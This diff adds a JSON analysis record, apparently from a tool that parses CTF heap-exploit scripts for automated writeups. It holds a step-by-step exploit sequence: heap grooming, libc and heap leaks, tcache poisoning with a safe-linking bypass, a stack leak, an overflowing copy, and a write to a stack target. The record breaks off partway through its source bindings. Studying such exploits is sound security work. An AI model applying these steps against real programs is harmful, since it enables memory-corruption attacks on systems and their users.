@@ -1,0 +1,2100 @@
+{
+  "run_id": "run_575f641ed07f44af8a7cfa835236f541",
+  "case_id": "local.ruanan.traditional-Traditional.a31b426a",
+  "source_hash": "a31b426a91241cd5de8551867155986a85d6c8e6fed7347d4a516e7dbfee913f",
+  "model": "qwen3-coder-30b-a3b-instruct",
+  "prompt_version": "pwncraft-heap-ai-v10-negative-rules",
+  "status": "completed",
+  "source_path": "C:\\Users\\WYH\\Desktop\\pwncraft\\pwncraft_v0.5.0\\artifacts\\heap_ai_writeups\\ruanan_finals_v1\\sources\\ruanan-a31b426a91241cd5.py",
+  "purpose": "semantic",
+  "static": {
+    "valid": true,
+    "operations": [
+      {
+        "op_id": "op_001",
+        "kind": "alloc",
+        "chunk": "A",
+        "index": "0",
+        "request_size": "0x100",
+        "data": "b'A'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,i) [i=0]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_002",
+        "kind": "alloc",
+        "chunk": "B",
+        "index": "1",
+        "request_size": "0x100",
+        "data": "b'B'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,i) [i=1]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_003",
+        "kind": "alloc",
+        "chunk": "C",
+        "index": "2",
+        "request_size": "0x100",
+        "data": "b'C'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,i) [i=2]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_004",
+        "kind": "alloc",
+        "chunk": "D",
+        "index": "3",
+        "request_size": "0x100",
+        "data": "b'D'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,i) [i=3]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_005",
+        "kind": "alloc",
+        "chunk": "E",
+        "index": "4",
+        "request_size": "0x100",
+        "data": "b'E'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,i) [i=4]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_006",
+        "kind": "alloc",
+        "chunk": "F",
+        "index": "5",
+        "request_size": "0x100",
+        "data": "b'F'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,i) [i=5]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_007",
+        "kind": "alloc",
+        "chunk": "G",
+        "index": "6",
+        "request_size": "0x100",
+        "data": "b'G'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,i) [i=6]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_008",
+        "kind": "alloc",
+        "chunk": "H",
+        "index": "7",
+        "request_size": "0x100",
+        "data": "b'H'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,i) [i=7]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_009",
+        "kind": "free",
+        "chunk": "B",
+        "index": "1",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(i) [i=1]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_010",
+        "kind": "free",
+        "chunk": "C",
+        "index": "2",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(i) [i=2]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_011",
+        "kind": "free",
+        "chunk": "D",
+        "index": "3",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(i) [i=3]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_012",
+        "kind": "free",
+        "chunk": "E",
+        "index": "4",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(i) [i=4]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_013",
+        "kind": "free",
+        "chunk": "F",
+        "index": "5",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(i) [i=5]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_014",
+        "kind": "free",
+        "chunk": "G",
+        "index": "6",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(i) [i=6]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_015",
+        "kind": "free",
+        "chunk": "H",
+        "index": "7",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(i) [i=7]",
+        "meta": {}
+      },
+      {
+        "op_id": "op_016",
+        "kind": "free",
+        "chunk": "A",
+        "index": "0",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(0)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_017",
+        "kind": "alloc",
+        "chunk": "I",
+        "index": "1",
+        "request_size": "0x100",
+        "data": "b'I'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100, i) [i=1]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_018",
+        "kind": "alloc",
+        "chunk": "J",
+        "index": "2",
+        "request_size": "0x100",
+        "data": "b'J'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100, i) [i=2]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_019",
+        "kind": "alloc",
+        "chunk": "K",
+        "index": "3",
+        "request_size": "0x100",
+        "data": "b'K'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100, i) [i=3]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_020",
+        "kind": "alloc",
+        "chunk": "L",
+        "index": "4",
+        "request_size": "0x100",
+        "data": "b'L'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100, i) [i=4]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_021",
+        "kind": "alloc",
+        "chunk": "M",
+        "index": "5",
+        "request_size": "0x100",
+        "data": "b'M'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100, i) [i=5]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_022",
+        "kind": "alloc",
+        "chunk": "N",
+        "index": "6",
+        "request_size": "0x100",
+        "data": "b'N'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100, i) [i=6]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_023",
+        "kind": "alloc",
+        "chunk": "O",
+        "index": "7",
+        "request_size": "0x100",
+        "data": "b'O'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100, i) [i=7]",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_024",
+        "kind": "alloc",
+        "chunk": "P",
+        "index": "0",
+        "request_size": "0x100",
+        "data": "b'P'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,0)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_025",
+        "kind": "show",
+        "chunk": "P",
+        "index": "0",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: show(0)",
+        "meta": {
+          "function": "show",
+          "expression": "show(0)",
+          "result_var": "data"
+        }
+      },
+      {
+        "op_id": "op_026",
+        "kind": "derive_value",
+        "chunk": "leak",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "u64(data[:6].ljust(8,b'\\x00'))",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: leak=u64(data[:6].ljust(8,b'\\x00'))",
+        "meta": {
+          "result_var": "leak",
+          "expression": "u64(data[:6].ljust(8,b'\\x00'))",
+          "dependencies": "data",
+          "source_kind": "derived",
+          "source": "leak=u64(data[:6].ljust(8,b'\\x00'))",
+          "provenance": "derived",
+          "byte_width": "8",
+          "endian": "little",
+          "observed_bytes": "6"
+        }
+      },
+      {
+        "op_id": "op_027",
+        "kind": "derive_value",
+        "chunk": "libc.address",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "leak-0x233c20",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: libc.address=leak-0x233c20",
+        "meta": {
+          "result_var": "libc.address",
+          "expression": "leak-0x233c20",
+          "dependencies": "leak",
+          "source_kind": "derived",
+          "source": "libc.address=leak-0x233c20",
+          "provenance": "derived"
+        }
+      },
+      {
+        "op_id": "op_028",
+        "kind": "show",
+        "chunk": "O",
+        "index": "7",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: show(7)",
+        "meta": {
+          "function": "show",
+          "expression": "show(7)",
+          "result_var": "data"
+        }
+      },
+      {
+        "op_id": "op_029",
+        "kind": "derive_value",
+        "chunk": "heap",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "u64(data[:5].ljust(8,b'\\x00'))<<12",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: heap=u64(data[:5].ljust(8,b'\\x00'))<<12",
+        "meta": {
+          "result_var": "heap",
+          "expression": "u64(data[:5].ljust(8,b'\\x00'))<<12",
+          "dependencies": "data",
+          "source_kind": "derived",
+          "source": "heap=u64(data[:5].ljust(8,b'\\x00'))<<12",
+          "provenance": "derived",
+          "byte_width": "8",
+          "endian": "little",
+          "observed_bytes": "5"
+        }
+      },
+      {
+        "op_id": "op_030",
+        "kind": "alloc",
+        "chunk": "Q",
+        "index": "14",
+        "request_size": "0x380",
+        "data": "b'Q'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x380,14)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_031",
+        "kind": "alloc",
+        "chunk": "R",
+        "index": "15",
+        "request_size": "0x380",
+        "data": "b'R'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x380,15)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_032",
+        "kind": "free",
+        "chunk": "",
+        "index": "0x80|14",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(0x80|14)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_033",
+        "kind": "free",
+        "chunk": "Q",
+        "index": "14",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(14)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_034",
+        "kind": "derive_value",
+        "chunk": "uaf_chunk",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "heap+0xf20",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: uaf_chunk=heap+0xf20",
+        "meta": {
+          "result_var": "uaf_chunk",
+          "expression": "heap+0xf20",
+          "dependencies": "heap",
+          "source_kind": "derived",
+          "source": "uaf_chunk=heap+0xf20",
+          "provenance": "derived"
+        }
+      },
+      {
+        "op_id": "op_035",
+        "kind": "show",
+        "chunk": "R",
+        "index": "15",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: show(15)",
+        "meta": {
+          "function": "show",
+          "expression": "show(15)",
+          "result_var": "old_fd_raw"
+        }
+      },
+      {
+        "op_id": "op_036",
+        "kind": "derive_value",
+        "chunk": "old_fd",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "u64(old_fd_raw[:8].ljust(8,b'\\x00'))",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: old_fd=u64(show(15)[:8].ljust(8,b'\\x00'))",
+        "meta": {
+          "result_var": "old_fd",
+          "expression": "u64(old_fd_raw[:8].ljust(8,b'\\x00'))",
+          "dependencies": "old_fd_raw",
+          "source_kind": "derived",
+          "source": "old_fd=u64(show(15)[:8].ljust(8,b'\\x00'))",
+          "provenance": "derived",
+          "byte_width": "8",
+          "endian": "little",
+          "observed_bytes": "8"
+        }
+      },
+      {
+        "op_id": "op_037",
+        "kind": "edit",
+        "chunk": "R",
+        "index": "15",
+        "request_size": "",
+        "data": "p64(target ^ (uaf_chunk>>12))",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: edit(15,p64(target ^ (uaf_chunk>>12)))",
+        "meta": {}
+      },
+      {
+        "op_id": "op_038",
+        "kind": "alloc",
+        "chunk": "S",
+        "index": "14",
+        "request_size": "0x380",
+        "data": "b'S'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x380,14)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_039",
+        "kind": "alloc",
+        "chunk": "T",
+        "index": "13",
+        "request_size": "0x380",
+        "data": "b'T'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x380,13)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_040",
+        "kind": "edit",
+        "chunk": "I",
+        "index": "1",
+        "request_size": "",
+        "data": "b'A'*0x30",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: edit(1,b'A'*0x30)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_041",
+        "kind": "copy",
+        "chunk": "T",
+        "index": "13",
+        "request_size": "0x18",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "I",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: copy(1,13,0x18)",
+        "meta": {
+          "src": "1",
+          "dst": "13",
+          "length": "0x18",
+          "src_chunk": "I",
+          "dst_chunk": "T"
+        }
+      },
+      {
+        "op_id": "op_042",
+        "kind": "show",
+        "chunk": "T",
+        "index": "13",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: show(13)",
+        "meta": {
+          "function": "show",
+          "expression": "show(13)",
+          "result_var": "data"
+        }
+      },
+      {
+        "op_id": "op_043",
+        "kind": "derive_value",
+        "chunk": "stack",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "u64(data[0x18:0x18+6].ljust(8,b'\\x00'))",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: stack=u64(data[0x18:0x18+6].ljust(8,b'\\x00'))",
+        "meta": {
+          "result_var": "stack",
+          "expression": "u64(data[0x18:0x18+6].ljust(8,b'\\x00'))",
+          "dependencies": "data",
+          "source_kind": "derived",
+          "source": "stack=u64(data[0x18:0x18+6].ljust(8,b'\\x00'))",
+          "provenance": "derived",
+          "byte_width": "8",
+          "endian": "little"
+        }
+      },
+      {
+        "op_id": "op_044",
+        "kind": "derive_value",
+        "chunk": "stack_target",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "stack-0x148",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: stack_target=stack-0x148",
+        "meta": {
+          "result_var": "stack_target",
+          "expression": "stack-0x148",
+          "dependencies": "stack",
+          "source_kind": "derived",
+          "source": "stack_target=stack-0x148",
+          "provenance": "derived"
+        }
+      },
+      {
+        "op_id": "op_045",
+        "kind": "alloc",
+        "chunk": "U",
+        "index": "8",
+        "request_size": "0xc0",
+        "data": "b'U'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0xc0,8)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_046",
+        "kind": "alloc",
+        "chunk": "V",
+        "index": "9",
+        "request_size": "0xa0",
+        "data": "b'V'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0xa0,9)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_047",
+        "kind": "alloc",
+        "chunk": "W",
+        "index": "10",
+        "request_size": "0x100",
+        "data": "b'W'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,10)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_048",
+        "kind": "alloc",
+        "chunk": "X",
+        "index": "11",
+        "request_size": "0x100",
+        "data": "b'X'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0x100,11)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_049",
+        "kind": "alloc",
+        "chunk": "Y",
+        "index": "12",
+        "request_size": "0xa0",
+        "data": "b'Y'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0xa0,12)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_050",
+        "kind": "derive_value",
+        "chunk": "victim",
+        "index": "",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "uaf_chunk+0x460",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: victim=uaf_chunk+0x460",
+        "meta": {
+          "result_var": "victim",
+          "expression": "uaf_chunk+0x460",
+          "dependencies": "uaf_chunk",
+          "source_kind": "derived",
+          "source": "victim=uaf_chunk+0x460",
+          "provenance": "derived"
+        }
+      },
+      {
+        "op_id": "op_051",
+        "kind": "edit",
+        "chunk": "W",
+        "index": "10",
+        "request_size": "",
+        "data": "b'B'*0x60+p64(stack_target ^ (victim>>12))",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: edit(10,b'B'*0x60+p64(stack_target ^ (victim>>12)))",
+        "meta": {}
+      },
+      {
+        "op_id": "op_052",
+        "kind": "free",
+        "chunk": "Y",
+        "index": "12",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(12)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_053",
+        "kind": "free",
+        "chunk": "V",
+        "index": "9",
+        "request_size": "",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: delete(9)",
+        "meta": {}
+      },
+      {
+        "op_id": "op_054",
+        "kind": "copy",
+        "chunk": "W",
+        "index": "10",
+        "request_size": "0xfffffff0",
+        "data": "",
+        "field": "",
+        "value": "",
+        "target": "X",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: copy(11,10,0xfffffff0)",
+        "meta": {
+          "src": "11",
+          "dst": "10",
+          "length": "0xfffffff0",
+          "src_chunk": "X",
+          "dst_chunk": "W"
+        }
+      },
+      {
+        "op_id": "op_055",
+        "kind": "alloc",
+        "chunk": "Z",
+        "index": "9",
+        "request_size": "0xa0",
+        "data": "b'Z'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0xa0,9)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_056",
+        "kind": "alloc",
+        "chunk": "AA",
+        "index": "12",
+        "request_size": "0xa0",
+        "data": "b'AA'",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: add(0xa0,12)",
+        "meta": {
+          "parse_confidence": "confirmed"
+        }
+      },
+      {
+        "op_id": "op_057",
+        "kind": "edit",
+        "chunk": "AA",
+        "index": "12",
+        "request_size": "",
+        "data": "payload",
+        "field": "",
+        "value": "",
+        "target": "",
+        "fd_storage": "",
+        "count": 1,
+        "note": "from EXP: edit(12,payload)",
+        "meta": {}
+      }
+    ],
+    "bindings": [
+      {
+        "source_id": "source_f988e890216f57eb",
+        "start": 1480,
+        "end": 1492,
+        "line": 46,
+        "end_line": 46,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "0"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_23664a34bc257dda",
+        "start": 1480,
+        "end": 1492,
+        "line": 46,
+        "end_line": 46,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "1"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_5f154017da41b0da",
+        "start": 1480,
+        "end": 1492,
+        "line": 46,
+        "end_line": 46,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "2"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_703e657acb03ec3a",
+        "start": 1480,
+        "end": 1492,
+        "line": 46,
+        "end_line": 46,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "3"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_ac3d547535c71c02",
+        "start": 1480,
+        "end": 1492,
+        "line": 46,
+        "end_line": 46,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "4"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_b061a274b128cec5",
+        "start": 1480,
+        "end": 1492,
+        "line": 46,
+        "end_line": 46,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "5"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_a74bcda691a5b49b",
+        "start": 1480,
+        "end": 1492,
+        "line": 46,
+        "end_line": 46,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "6"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_230396a372771f25",
+        "start": 1480,
+        "end": 1492,
+        "line": 46,
+        "end_line": 46,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "7"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_bc4684ec734456c6",
+        "start": 1525,
+        "end": 1534,
+        "line": 49,
+        "end_line": 49,
+        "fingerprint": "9a4ab9d6c90d4806",
+        "loop_env": [
+          [
+            "i",
+            "1"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_31c1c06dbbf76902",
+        "start": 1525,
+        "end": 1534,
+        "line": 49,
+        "end_line": 49,
+        "fingerprint": "9a4ab9d6c90d4806",
+        "loop_env": [
+          [
+            "i",
+            "2"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_c42a8dddb9c57951",
+        "start": 1525,
+        "end": 1534,
+        "line": 49,
+        "end_line": 49,
+        "fingerprint": "9a4ab9d6c90d4806",
+        "loop_env": [
+          [
+            "i",
+            "3"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_fefce9925ef7eb35",
+        "start": 1525,
+        "end": 1534,
+        "line": 49,
+        "end_line": 49,
+        "fingerprint": "9a4ab9d6c90d4806",
+        "loop_env": [
+          [
+            "i",
+            "4"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_6e67e07b36c1088a",
+        "start": 1525,
+        "end": 1534,
+        "line": 49,
+        "end_line": 49,
+        "fingerprint": "9a4ab9d6c90d4806",
+        "loop_env": [
+          [
+            "i",
+            "5"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_ae30c2482bab7ef3",
+        "start": 1525,
+        "end": 1534,
+        "line": 49,
+        "end_line": 49,
+        "fingerprint": "9a4ab9d6c90d4806",
+        "loop_env": [
+          [
+            "i",
+            "6"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_32653165c70f0a96",
+        "start": 1525,
+        "end": 1534,
+        "line": 49,
+        "end_line": 49,
+        "fingerprint": "9a4ab9d6c90d4806",
+        "loop_env": [
+          [
+            "i",
+            "7"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_68ddb78c396da4d9",
+        "start": 1536,
+        "end": 1545,
+        "line": 50,
+        "end_line": 50,
+        "fingerprint": "3ec7da9fc208557d",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_23664a34bc257dda",
+        "start": 1574,
+        "end": 1587,
+        "line": 52,
+        "end_line": 52,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "1"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_5f154017da41b0da",
+        "start": 1574,
+        "end": 1587,
+        "line": 52,
+        "end_line": 52,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "2"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_703e657acb03ec3a",
+        "start": 1574,
+        "end": 1587,
+        "line": 52,
+        "end_line": 52,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "3"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_ac3d547535c71c02",
+        "start": 1574,
+        "end": 1587,
+        "line": 52,
+        "end_line": 52,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "4"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_b061a274b128cec5",
+        "start": 1574,
+        "end": 1587,
+        "line": 52,
+        "end_line": 52,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "5"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_a74bcda691a5b49b",
+        "start": 1574,
+        "end": 1587,
+        "line": 52,
+        "end_line": 52,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "6"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_230396a372771f25",
+        "start": 1574,
+        "end": 1587,
+        "line": 52,
+        "end_line": 52,
+        "fingerprint": "b1a644ebf218b24a",
+        "loop_env": [
+          [
+            "i",
+            "7"
+          ]
+        ],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_b6f652a92bf49f71",
+        "start": 1594,
+        "end": 1606,
+        "line": 54,
+        "end_line": 54,
+        "fingerprint": "43985209249491a2",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_47a834b61ab84c56",
+        "start": 1613,
+        "end": 1620,
+        "line": 55,
+        "end_line": 55,
+        "fingerprint": "64429c787f5d15fc",
+        "loop_env": [],
+        "confidence": "confirmed",
+        "match_status": "matched"
+      },
+      {
+        "source_id": "source_a689fc5329131cb7",
+        "start": 1622,
+        "end": 1657,
+        "line": 56,
+        "end_line": 56,
